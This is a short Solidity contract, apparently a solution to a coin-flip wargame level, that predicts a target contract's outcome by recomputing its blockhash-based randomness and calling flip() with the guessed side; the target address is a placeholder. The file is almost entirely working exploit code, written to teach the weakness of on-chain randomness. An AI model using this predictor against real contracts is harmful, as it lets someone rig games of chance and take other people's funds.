
pragma solidity ^0.6.0;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool guess) external returns (bool);
 }
 
contract Flipper {

    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;
    CoinFlip public flipper;
    
    constructor() public {
        flipper = CoinFlip(xxxxxxxxxx);
    }
    
 

   function doFlip() public{
       uint256 blockValue = uint256(blockhash(block.number - 1));
       uint256 coinFlip = uint256(uint256(blockValue)/FACTOR);
       side = coinFlip == 1 ? true : false;
       flipper.flip(side);
    }
    
   

}


